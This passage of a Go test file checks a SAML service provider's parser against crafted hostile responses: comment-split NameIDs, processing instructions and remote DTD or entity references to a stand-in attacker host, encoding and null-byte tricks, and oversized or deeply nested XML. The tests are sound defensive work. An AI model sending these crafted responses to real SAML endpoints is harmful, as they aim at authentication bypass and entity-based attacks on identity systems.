    </saml2:Conditions>
  </saml2:Assertion>
</saml2p:Response>`,
		sp.ACSURL, now.Format(time.RFC3339), sp.IDPEntityID,
		now.Format(time.RFC3339), sp.IDPEntityID,
		now.Add(5*time.Minute).Format(time.RFC3339), sp.ACSURL,
		now.Add(-5*time.Minute).Format(time.RFC3339), now.Add(5*time.Minute).Format(time.RFC3339),
		sp.AudienceURIs[0])

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "Fake signature with wrong namespace prefix should be rejected")
	t.Logf("Correctly rejected wrong-prefix signature: %v", err)
}

// ---------------------------------------------------------------------------
// Comment Injection Tests (22-24)
// ---------------------------------------------------------------------------

func TestSecurityXML_CommentSplittingNameID(t *testing.T) {
	// Test 22: Comment splitting NameID value (admin<!---->@evil.com).
	// This tests the CVE-2020-29509 class of vulnerabilities. Go's encoding/xml
	// concatenates text nodes around comments. The key defense is that the
	// canonical value must include ALL text (not be truncated at the comment).
	sp, _ := securityTestSP(t)

	resp := samlResponseTemplate(sp, "admin<!--injected-->@evil.com")

	// The strict parser rejects the comment outright — strictly stronger than
	// relying on text-node concatenation.
	_, _, err := parseResponse([]byte(resp), 0)
	require.Error(t, err, "comment injection must be rejected at parse time")
	require.Contains(t, err.Error(), "comments are not allowed")
}

func TestSecurityXML_CommentBetweenElementTags(t *testing.T) {
	// Test 23: Comment between element tags.
	sp, _ := securityTestSP(t)

	now := sp.now()
	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" InResponseTo="_request_id_1" IssueInstant="%s" Version="2.0">
  <!-- injected comment before Issuer -->
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">%s</saml2:Issuer>
  <saml2p:Status><!-- comment inside Status --><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
  <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="_a1" Version="2.0" IssueInstant="%s">
    <!-- comment inside assertion -->
    <saml2:Issuer>%s</saml2:Issuer>
    <saml2:Subject>
      <saml2:NameID>user@example.com</saml2:NameID>
      <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml2:SubjectConfirmationData InResponseTo="_request_id_1" NotOnOrAfter="%s" Recipient="%s"/>
      </saml2:SubjectConfirmation>
    </saml2:Subject>
    <saml2:Conditions NotBefore="%s" NotOnOrAfter="%s">
      <saml2:AudienceRestriction><saml2:Audience>%s</saml2:Audience></saml2:AudienceRestriction>
    </saml2:Conditions>
  </saml2:Assertion>
</saml2p:Response>`,
		sp.ACSURL, now.Format(time.RFC3339), sp.IDPEntityID,
		now.Format(time.RFC3339), sp.IDPEntityID,
		now.Add(5*time.Minute).Format(time.RFC3339), sp.ACSURL,
		now.Add(-5*time.Minute).Format(time.RFC3339), now.Add(5*time.Minute).Format(time.RFC3339),
		sp.AudienceURIs[0])

	// The strict profile rejects comments anywhere in a protocol message,
	// including between elements.
	_, _, err := parseResponse([]byte(maliciousXML), 0)
	require.Error(t, err, "comments in a protocol message must be rejected")
	require.Contains(t, err.Error(), "comments are not allowed")
}

func TestSecurityXML_CommentDoubleHyphen(t *testing.T) {
	// Test 24: Comment containing double-hyphen sequence (-- inside comment).
	// XML spec forbids -- inside comments. The parser should reject this.
	maliciousXML := `<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="https://sp.example.com/acs" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <!-- this -- is -- forbidden -->
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">test</saml2:Issuer>
</saml2p:Response>`

	_, _, err := parseResponse([]byte(maliciousXML), 0)
	// The XML spec says -- is not allowed inside comments. Go's parser may or
	// may not enforce this. Either way we document the behavior.
	if err != nil {
		t.Logf("Parser correctly rejected double-hyphen in comment: %v", err)
	} else {
		t.Log("Parser accepted double-hyphen in comment (Go's xml parser is lenient here)")
	}
}

// ---------------------------------------------------------------------------
// Mixed Content Tests (25-26)
// ---------------------------------------------------------------------------

func TestSecurityXML_MixedContent_TextAndElements(t *testing.T) {
	// Test 25: Mixed content (text + elements) in Assertion elements.
	sp, _ := securityTestSP(t)

	now := sp.now()
	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" InResponseTo="_request_id_1" IssueInstant="%s" Version="2.0">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">%s</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
  <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="_a1" Version="2.0" IssueInstant="%s">
    INJECTED TEXT BEFORE ISSUER
    <saml2:Issuer>%s</saml2:Issuer>
    <saml2:Subject>
      <saml2:NameID>user@example.com</saml2:NameID>
      <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml2:SubjectConfirmationData InResponseTo="_request_id_1" NotOnOrAfter="%s" Recipient="%s"/>
      </saml2:SubjectConfirmation>
    </saml2:Subject>
    <saml2:Conditions NotBefore="%s" NotOnOrAfter="%s">
      <saml2:AudienceRestriction><saml2:Audience>%s</saml2:Audience></saml2:AudienceRestriction>
    </saml2:Conditions>
  </saml2:Assertion>
</saml2p:Response>`,
		sp.ACSURL, now.Format(time.RFC3339), sp.IDPEntityID,
		now.Format(time.RFC3339), sp.IDPEntityID,
		now.Add(5*time.Minute).Format(time.RFC3339), sp.ACSURL,
		now.Add(-5*time.Minute).Format(time.RFC3339), now.Add(5*time.Minute).Format(time.RFC3339),
		sp.AudienceURIs[0])

	// Unsigned, so should fail. The key thing is that mixed content doesn't crash.
	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "Unsigned response with mixed content should be rejected")
	t.Logf("Mixed content handled without crash: %v", err)
}

func TestSecurityXML_MixedContent_SignificantWhitespace(t *testing.T) {
	// Test 26: Mixed content with significant whitespace.
	sp, _ := securityTestSP(t)

	resp := samlResponseTemplate(sp, "  user@example.com  ")

	_, el, err := parseResponse([]byte(resp), 0)
	require.NoError(t, err)

	decodedResponse := &types.Response{}
	err = xmlUnmarshalElement(el, decodedResponse)
	require.NoError(t, err)

	if len(decodedResponse.Assertions) > 0 {
		nameID := decodedResponse.Assertions[0].Subject.NameID.Value
		t.Logf("NameID with whitespace: %q (length %d)", nameID, len(nameID))
		// Whitespace handling varies; just confirm the core value is present
		require.Contains(t, nameID, "user@example.com",
			"NameID should contain the email address regardless of whitespace handling")
	}
}

// ---------------------------------------------------------------------------
// Processing Instruction Tests (27-29)
// ---------------------------------------------------------------------------

func TestSecurityXML_PI_BeforeRootElement(t *testing.T) {
	// Test 27: PI before root element (xml-stylesheet).
	sp, _ := securityTestSP(t)

	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="http://evil.example.com/transform.xsl"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">%s</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
</saml2p:Response>`, sp.ACSURL, sp.IDPEntityID)

	// PI before root is valid XML. The parser should accept it but the SP
	// must not follow the stylesheet reference.
	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	// Should still fail (no assertions, no signature, etc.)
	require.Error(t, err, "Response with PI should still fail validation")
	t.Logf("PI before root element handled correctly: %v", err)
}

func TestSecurityXML_PI_InsideSignedElement(t *testing.T) {
	// Test 28: PI inside signed element.
	sp, _ := securityTestSP(t)

	now := sp.now()
	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" InResponseTo="_request_id_1" IssueInstant="%s" Version="2.0">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">%s</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
  <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="_a1" Version="2.0" IssueInstant="%s">
    <?evil-pi target="http://evil.example.com"?>
    <saml2:Issuer>%s</saml2:Issuer>
    <saml2:Subject>
      <saml2:NameID>user@example.com</saml2:NameID>
      <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml2:SubjectConfirmationData InResponseTo="_request_id_1" NotOnOrAfter="%s" Recipient="%s"/>
      </saml2:SubjectConfirmation>
    </saml2:Subject>
    <saml2:Conditions NotBefore="%s" NotOnOrAfter="%s">
      <saml2:AudienceRestriction><saml2:Audience>%s</saml2:Audience></saml2:AudienceRestriction>
    </saml2:Conditions>
  </saml2:Assertion>
</saml2p:Response>`,
		sp.ACSURL, now.Format(time.RFC3339), sp.IDPEntityID,
		now.Format(time.RFC3339), sp.IDPEntityID,
		now.Add(5*time.Minute).Format(time.RFC3339), sp.ACSURL,
		now.Add(-5*time.Minute).Format(time.RFC3339), now.Add(5*time.Minute).Format(time.RFC3339),
		sp.AudienceURIs[0])

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "Unsigned response with PI in assertion should be rejected")
	t.Logf("PI inside signed element handled correctly: %v", err)
}

func TestSecurityXML_PI_MimickingXMLDeclaration(t *testing.T) {
	// Test 29: PI mimicking xml declaration inside body.
	maliciousXML := `<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="https://sp.example.com/acs" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <?xml version="1.1" encoding="UTF-16"?>
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">test</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
</saml2p:Response>`

	_, _, err := parseResponse([]byte(maliciousXML), 0)
	// "xml" PI name is reserved. Go's parser should reject or ignore it.
	if err != nil {
		t.Logf("Correctly rejected xml PI inside body: %v", err)
	} else {
		t.Log("Parser accepted xml PI inside body (Go may silently ignore it)")
	}
}

// ---------------------------------------------------------------------------
// DTD Tests (30-32)
// ---------------------------------------------------------------------------

func TestSecurityXML_DOCTYPE_InternalSubset(t *testing.T) {
	// Test 30: DOCTYPE with internal subset redefining element default attributes.
	sp, _ := securityTestSP(t)

	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Response [
  <!ATTLIST Response Destination CDATA "https://evil.example.com/acs">
]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">%s</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
</saml2p:Response>`, sp.IDPEntityID)

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "DOCTYPE with ATTLIST should be rejected by rtvalidator")
	t.Logf("Correctly rejected DOCTYPE with internal subset: %v", err)
}

func TestSecurityXML_DOCTYPE_RemoteDTD(t *testing.T) {
	// Test 31: DOCTYPE pointing to remote DTD.
	sp, _ := securityTestSP(t)

	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Response SYSTEM "http://evil.example.com/evil.dtd">
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">%s</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
</saml2p:Response>`, sp.ACSURL, sp.IDPEntityID)

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "DOCTYPE with remote DTD reference should be rejected")
	t.Logf("Correctly rejected remote DTD reference: %v", err)
}

func TestSecurityXML_DOCTYPE_NotationDeclaration(t *testing.T) {
	// Test 32: DOCTYPE with NOTATION declarations.
	sp, _ := securityTestSP(t)

	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Response [
  <!NOTATION gif SYSTEM "image/gif">
  <!ENTITY pic SYSTEM "http://evil.example.com/pic.gif" NDATA gif>
]>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">%s</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
</saml2p:Response>`, sp.ACSURL, sp.IDPEntityID)

	_, err := sp.ValidateEncodedResponse(context.Background(), encodeResponse(maliciousXML))
	require.Error(t, err, "DOCTYPE with NOTATION declarations should be rejected")
	t.Logf("Correctly rejected NOTATION declarations: %v", err)
}

// ---------------------------------------------------------------------------
// Encoding Tests (33-35)
// ---------------------------------------------------------------------------

func TestSecurityXML_Encoding_UTF7(t *testing.T) {
	// Test 33: UTF-7 encoded response.
	// Go's XML parser only supports UTF-8. UTF-7 should fail.
	utf7Response := `<?xml version="1.0" encoding="UTF-7"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="https://sp.example.com/acs" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">test</saml2:Issuer>
</saml2p:Response>`

	_, _, err := parseResponse([]byte(utf7Response), 0)
	// Go's xml parser should reject non-UTF-8 encodings
	if err != nil {
		t.Logf("Correctly rejected UTF-7 encoding: %v", err)
	} else {
		t.Log("Parser accepted UTF-7 declaration but likely parsed as UTF-8 (Go ignores encoding attribute)")
	}
}

func TestSecurityXML_Encoding_UTF16BE_WithBOM(t *testing.T) {
	// Test 34: UTF-16 Big-Endian with BOM.
	// Go's XML parser expects UTF-8. UTF-16 encoded bytes should fail parsing.
	utf16beXML := `<?xml version="1.0" encoding="UTF-16"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="https://sp.example.com/acs" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">test</saml2:Issuer>
</saml2p:Response>`

	// Prepend UTF-16 BE BOM and convert to actual UTF-16 BE bytes
	bom := []byte{0xFE, 0xFF}
	// For a proper UTF-16 test, we encode each byte with a null prefix
	utf8Bytes := []byte(utf16beXML)
	utf16Bytes := make([]byte, 0, len(bom)+len(utf8Bytes)*2)
	utf16Bytes = append(utf16Bytes, bom...)
	for _, b := range utf8Bytes {
		utf16Bytes = append(utf16Bytes, 0, b)
	}

	_, _, err := parseResponse(utf16Bytes, 0)
	require.Error(t, err, "UTF-16 BE encoded response should fail parsing")
	t.Logf("Correctly rejected UTF-16 BE: %v", err)
}

func TestSecurityXML_Encoding_UTF16LE_WithoutBOM(t *testing.T) {
	// Test 35: UTF-16 Little-Endian without BOM.
	utf16leXML := `<?xml version="1.0" encoding="UTF-16"?>
<Response/>`

	// Convert to actual UTF-16 LE bytes (no BOM)
	utf8Bytes := []byte(utf16leXML)
	utf16Bytes := make([]byte, 0, len(utf8Bytes)*2)
	for _, b := range utf8Bytes {
		utf16Bytes = append(utf16Bytes, b, 0)
	}

	_, _, err := parseResponse(utf16Bytes, 0)
	require.Error(t, err, "UTF-16 LE encoded response should fail parsing")
	t.Logf("Correctly rejected UTF-16 LE: %v", err)
}

// ---------------------------------------------------------------------------
// BOM Tests (36-38)
// ---------------------------------------------------------------------------

func TestSecurityXML_BOM_UTF8Prepended(t *testing.T) {
	// Test 36: UTF-8 BOM prepended.
	sp, _ := securityTestSP(t)

	validResp := makeValidResponse(sp)
	bomBytes := append([]byte{0xEF, 0xBB, 0xBF}, []byte(validResp)...)

	_, _, err := parseResponse(bomBytes, 0)
	if err != nil {
		t.Logf("Parser rejected UTF-8 BOM prepended: %v", err)
	} else {
		t.Log("Parser accepted UTF-8 BOM (etree handles this)")
	}
}

func TestSecurityXML_BOM_Double(t *testing.T) {
	// Test 37: Double BOM.
	sp, _ := securityTestSP(t)

	validResp := makeValidResponse(sp)
	// Two consecutive UTF-8 BOMs
	doubleBOM := append([]byte{0xEF, 0xBB, 0xBF, 0xEF, 0xBB, 0xBF}, []byte(validResp)...)

	_, _, err := parseResponse(doubleBOM, 0)
	if err != nil {
		t.Logf("Parser rejected double BOM (expected): %v", err)
	} else {
		t.Log("Parser accepted double BOM (unexpected but not exploitable)")
	}
}

func TestSecurityXML_BOM_BetweenDeclarationAndRoot(t *testing.T) {
	// Test 38: BOM between XML declaration and root.
	xmlDecl := `<?xml version="1.0" encoding="UTF-8"?>`
	body := `<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="https://sp.example.com/acs" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">test</saml2:Issuer>
</saml2p:Response>`

	// Insert BOM between declaration and root
	malicious := append([]byte(xmlDecl), 0xEF, 0xBB, 0xBF)
	malicious = append(malicious, []byte(body)...)

	_, _, err := parseResponse(malicious, 0)
	if err != nil {
		t.Logf("Parser rejected BOM between declaration and root: %v", err)
	} else {
		t.Log("Parser accepted BOM between declaration and root (XML spec allows this)")
	}
}

// ---------------------------------------------------------------------------
// Null Byte Tests (39-41)
// ---------------------------------------------------------------------------

func TestSecurityXML_NullByte_InNameID(t *testing.T) {
	// Test 39: Null byte in NameID value.
	sp, _ := securityTestSP(t)

	resp := samlResponseTemplate(sp, "admin\x00@evil.com")

	// Null bytes are not valid in XML 1.0. The parser should reject this.
	_, _, err := parseResponse([]byte(resp), 0)
	if err != nil {
		t.Logf("Parser correctly rejected null byte in NameID: %v", err)
		return
	}

	// If parser accepts it, check the value
	t.Log("Parser accepted null byte; verifying it is preserved or stripped")
}

func TestSecurityXML_NullByte_InDestination(t *testing.T) {
	// Test 40: Null byte in Destination attribute value.
	maliciousXML := `<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="https://sp.example.com/acs` + "\x00" + `evil" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">test</saml2:Issuer>
</saml2p:Response>`

	_, _, err := parseResponse([]byte(maliciousXML), 0)
	if err != nil {
		t.Logf("Parser correctly rejected null byte in Destination: %v", err)
	} else {
		t.Log("Parser accepted null byte in attribute (verify Destination validation catches it)")
	}
}

func TestSecurityXML_NullByte_InNamespaceURI(t *testing.T) {
	// Test 41: Null byte in namespace URI.
	maliciousXML := `<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol` + "\x00" + `"
    Destination="https://sp.example.com/acs" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">test</saml2:Issuer>
</saml2p:Response>`

	_, _, err := parseResponse([]byte(maliciousXML), 0)
	if err != nil {
		t.Logf("Parser correctly rejected null byte in namespace URI: %v", err)
	} else {
		t.Log("Parser accepted null byte in namespace (Go may be lenient)")
	}
}

// ---------------------------------------------------------------------------
// Size/Depth Tests (42-44)
// ---------------------------------------------------------------------------

func TestSecurityXML_OversizedResponse_DecompressionLimit(t *testing.T) {
	// Test 42: Oversized response exceeding decompression limit.
	sp, _ := securityTestSP(t)
	sp.MaximumDecompressedBodySize = 1024 // 1 KB limit

	// Build an XML payload larger than 1KB
	largeXML := `<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="https://sp.example.com/acs" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">test</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
  <Padding>` + strings.Repeat("A", 2048) + `</Padding>
</saml2p:Response>`

	// DEFLATE compress then base64 encode
	var buf bytes.Buffer
	w, err := flate.NewWriter(&buf, flate.DefaultCompression)
	require.NoError(t, err)
	_, err = w.Write([]byte(largeXML))
	require.NoError(t, err)
	require.NoError(t, w.Close())

	encoded := base64.StdEncoding.EncodeToString(buf.Bytes())

	_, err = sp.ValidateEncodedResponse(context.Background(), encoded)
	require.Error(t, err, "Oversized compressed response should be rejected")
	require.Contains(t, err.Error(), "exceeds maximum size",
		"Error should mention size limit")
	t.Logf("Correctly rejected oversized compressed response: %v", err)
}

func TestSecurityXML_OversizedResponse_Uncompressed(t *testing.T) {
	// Test 43: Oversized uncompressed response (without compression).
	sp, _ := securityTestSP(t)
	sp.MaximumDecompressedBodySize = 512 // Very small limit

	// Build a plain XML payload larger than limit
	largeXML := `<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="https://sp.example.com/acs" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">test</saml2:Issuer>
  <Padding>` + strings.Repeat("B", 1024) + `</Padding>
</saml2p:Response>`

	encoded := encodeResponse(largeXML)

	// For uncompressed, the response goes through base64 decode then direct parse.
	// The size limit applies during maybeDeflate's deflate attempt.
	_, err := sp.ValidateEncodedResponse(context.Background(), encoded)
	// Even without compression, the parser should handle the data. The size
	// limit primarily applies to deflated data. This verifies the behavior.
	if err != nil {
		t.Logf("Rejected oversized uncompressed response: %v", err)
	} else {
		t.Log("Accepted uncompressed response (size limit only enforced during deflation)")
	}
}

func TestSecurityXML_DeeplyNestedXML(t *testing.T) {
	// Test 44: Deeply nested XML (10,000+ levels).
	var sb strings.Builder
	sb.WriteString(`<?xml version="1.0" encoding="UTF-8"?>`)
	depth := 10000
	for i := 0; i < depth; i++ {
		sb.WriteString(fmt.Sprintf(`<level%d>`, i))
	}
	sb.WriteString("deep")
	for i := depth - 1; i >= 0; i-- {
		sb.WriteString(fmt.Sprintf(`</level%d>`, i))
	}

	deepXML := sb.String()
	_, _, err := parseResponse([]byte(deepXML), 0)
	if err != nil {
		t.Logf("Parser rejected deeply nested XML: %v", err)
	} else {
		t.Log("Parser accepted deeply nested XML (Go's xml parser has no depth limit)")
	}
}

// ---------------------------------------------------------------------------
// Version/Normalization Tests (45-48)
// ---------------------------------------------------------------------------

func TestSecurityXML_XML11_Declaration(t *testing.T) {
	// Test 45: XML 1.1 declaration with NEL/LS line endings.
	// Go's encoding/xml only supports XML 1.0. XML 1.1 should be rejected or
	// the NEL/LS characters should not alter parsing.
	xml11 := "<?xml version=\"1.1\" encoding=\"UTF-8\"?>\n" +
		"<saml2p:Response xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\"\n" +
		"    Destination=\"https://sp.example.com/acs\" ID=\"_resp_1\" Version=\"2.0\" IssueInstant=\"2025-01-01T00:00:00Z\">\n" +
		"  <saml2:Issuer xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">test</saml2:Issuer>\n" +
		"</saml2p:Response>"

	_, _, err := parseResponse([]byte(xml11), 0)
	if err != nil {
		t.Logf("Parser rejected XML 1.1 declaration: %v", err)
	} else {
		t.Log("Parser accepted XML 1.1 (Go may ignore version attribute)")
	}
}

func TestSecurityXML_AttributeValueNormalization(t *testing.T) {
	// Test 46: Attribute value normalization with tabs/newlines in Destination.
	// XML parsers should normalize \t, \n, \r in attributes to spaces.
	sp, _ := securityTestSP(t)

	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s&#9;&#10;&#13;" ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">%s</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
</saml2p:Response>`, sp.ACSURL, sp.IDPEntityID)

	_, el, err := parseResponse([]byte(maliciousXML), 0)
	if err != nil {
		t.Logf("Parser rejected attribute with control chars: %v", err)
		return
	}

	decodedResponse := &types.Response{}
	err = xmlUnmarshalElement(el, decodedResponse)
	require.NoError(t, err)

	// The Destination should have normalized whitespace
	dest := decodedResponse.Destination
	require.NotEqual(t, sp.ACSURL, dest,
		"Destination with extra whitespace chars should differ from clean ACS URL")
	t.Logf("Destination after normalization: %q", dest)
}

func TestSecurityXML_CharacterReferenceNormalization(t *testing.T) {
	// Test 47: Character reference normalization (&#9;, &#10;) in attributes.
	maliciousXML := `<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="&#104;&#116;&#116;&#112;&#115;://sp.example.com/acs"
    ID="_resp_1" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">test</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
</saml2p:Response>`

	_, el, err := parseResponse([]byte(maliciousXML), 0)
	require.NoError(t, err)

	decodedResponse := &types.Response{}
	err = xmlUnmarshalElement(el, decodedResponse)
	require.NoError(t, err)

	// Character references should be resolved to actual characters
	require.Equal(t, "https://sp.example.com/acs", decodedResponse.Destination,
		"Character references in Destination should be resolved")
	t.Logf("Character references correctly resolved in Destination: %q", decodedResponse.Destination)
}

func TestSecurityXML_WhitespaceOnlyAudience(t *testing.T) {
	// Test 48: Whitespace-only content in Audience element.
	// Audience checking happens in verifyAssertionConditions (called by
	// RetrieveAssertionInfo), not in ValidateEncodedResponse. We test via
	// RetrieveAssertionInfo to exercise the full validation pipeline.
	sp, _ := securityTestSP(t)

	now := sp.now()
	maliciousXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="%s" ID="_resp_1" InResponseTo="_request_id_1" IssueInstant="%s" Version="2.0">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">%s</saml2:Issuer>
  <saml2p:Status><saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></saml2p:Status>
  <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="_a1" Version="2.0" IssueInstant="%s">
    <saml2:Issuer>%s</saml2:Issuer>
    <saml2:Subject>
      <saml2:NameID>user@example.com</saml2:NameID>
      <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml2:SubjectConfirmationData InResponseTo="_request_id_1" NotOnOrAfter="%s" Recipient="%s"/>
      </saml2:SubjectConfirmation>
    </saml2:Subject>
    <saml2:Conditions NotBefore="%s" NotOnOrAfter="%s">
      <saml2:AudienceRestriction><saml2:Audience>   </saml2:Audience></saml2:AudienceRestriction>
    </saml2:Conditions>
    <saml2:AuthnStatement AuthnInstant="%s" SessionIndex="_session_1">
      <saml2:AuthnContext>
        <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
      </saml2:AuthnContext>
    </saml2:AuthnStatement>
  </saml2:Assertion>
</saml2p:Response>`,
		sp.ACSURL, now.Format(time.RFC3339), sp.IDPEntityID,
		now.Format(time.RFC3339), sp.IDPEntityID,
		now.Add(5*time.Minute).Format(time.RFC3339), sp.ACSURL,
		now.Add(-5*time.Minute).Format(time.RFC3339), now.Add(5*time.Minute).Format(time.RFC3339),
		now.Format(time.RFC3339))

	// Sign with assertion-only signature so it passes sig validation
	signed := signAssertionOnly(t, maliciousXML, sp)
